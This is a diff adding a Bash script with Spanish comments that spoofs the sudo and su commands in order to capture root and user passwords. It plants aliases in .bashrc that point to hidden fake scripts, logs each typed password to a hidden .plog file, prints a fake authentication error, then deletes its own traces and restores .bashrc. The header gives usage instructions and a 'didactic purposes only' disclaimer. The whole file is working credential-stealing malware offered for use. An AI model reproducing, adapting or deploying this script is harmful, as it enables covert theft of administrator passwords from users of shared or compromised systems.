@@ -1,0 +1,76 @@
+#!/bin/bash
+#
+##############################################################################
+#
+#
+# Descripcion: Falsifica los comandos sudo y su haciendose pasar por
+#        los mismos con el fin de obtener el password del root.
+#        Una vez obtenido el password es guardado en un log
+#        llamado: .plog en el home del usuario.
+#
+#
+# Explicacion del modo de operacion:
+# (1) Se crea una copia del archivo .bashrc llamada .bashrcbk.
+# (2) Se crean dos alias en el .bashrc original de los commandos
+#     <sudo> y <su> que llaman a nuestro programa en caso de ser
+#     invocado cualquiera de los dos.
+# (3) Se crearan dos scripts que simulan los comandos <sudo> y <su>
+#     y capturan el password del root guardandolo en el archivo
+#     .plog en el home del usuario. Estos archivos se encuentran
+#     en el home del usuario con los nombres: ".sudo_su" y ".sudo_sd".
+# (4) Se restaura el .bashrc original desde la copia .bashrcbk.
+# (5) Se borran los archivos creados.
+# (6) Se ejecuta <bash> cargando el .bashrc original para no
+#     tener que reiniciar el terminal en ese momento.
+#
+# Modo de empleo:
+# (1) Ejecutar el programa desde un terminal: <sh sskeylogger.sh> (o el nombre
+#     que le quieras poner), o darle permisos de ejecucion y ejecutarlo
+#     desde el navegador de archivos.
+# (2) Cerrar el terminal.
+# (3) Esperar a que sea ejecutado el comando <sudo> o <su>.
+# (4) Leer el log generado, puede ser con el siguiente comando:
+#     <cat $HOME/.plog>
+#
+# Nota: Este programa fue escrito exclusivamente con fines didacticos, por lo
+# que el escritor no se hace responsable de un mal uso del mismo.
+#
+##############################################################################
+ 
+# Backup del .bashrc
+cp $HOME/.bashrc $HOME/.bashrcbk;
+ 
+# Suplantacion de <su>
+echo "alias su='$HOME/.sudo_su'" >> $HOME/.bashrc;
+echo "#!/bin/bash"> $HOME/.sudo_su;
+echo "mv $HOME/.bashrcbk $HOME/.bashrc" >> $HOME/.sudo_su;
+echo "stty -echo" >> $HOME/.sudo_su;
+echo "read -p \"Contraseña: \" IN" >> $HOME/.sudo_su;
+echo "stty echo" >> $HOME/.sudo_su;
+echo "echo" >> $HOME/.sudo_su;
+echo "date >> $HOME/.plog" >> $HOME/.sudo_su;
+echo "echo Password: \$IN >> $HOME/.plog" >> $HOME/.sudo_su;
+echo "sleep 2" >> $HOME/.sudo_su;
+echo "echo \"su: Fallo de autenticación\"" >> $HOME/.sudo_su;
+echo "rm \$HOME/.sudo_sd" >> $HOME/.sudo_su;
+echo "rm \`basename \$0\`" >> $HOME/.sudo_su;
+echo "bash --rcfile .bashrc" >> $HOME/.sudo_su;
+chmod 755 $HOME/.sudo_su;
+ 
+# Suplantacion de <sudo>
+echo "alias sudo='$HOME/.sudo_sd'" >> $HOME/.bashrc;
+echo "#!/bin/bash"> $HOME/.sudo_sd;
+echo "mv $HOME/.bashrcbk $HOME/.bashrc" >> $HOME/.sudo_sd;
+echo "stty -echo" >> $HOME/.sudo_sd;
+echo "read -p \"[sudo] password for `id -un`: \" IN" >> $HOME/.sudo_sd;
+echo "stty echo" >> $HOME/.sudo_sd;
+echo "echo" >> $HOME/.sudo_sd;
+echo "date >> $HOME/.plog" >> $HOME/.sudo_sd;
+echo "echo Password: \$IN >> $HOME/.plog" >> $HOME/.sudo_sd;
+echo "sleep 2" >> $HOME/.sudo_sd;
+echo "echo \"Sorry, try again.\"" >> $HOME/.sudo_sd;
+echo "rm \`basename \$0\`" >> $HOME/.sudo_sd;
+echo "rm \$HOME/.sudo_su" >> $HOME/.sudo_sd;
+echo "sudo -k;" >> $HOME/.sudo_sd;
+echo "sudo \$*; bash --rcfile .bashrc" >> $HOME/.sudo_sd;
+chmod 755 $HOME/.sudo_sd;
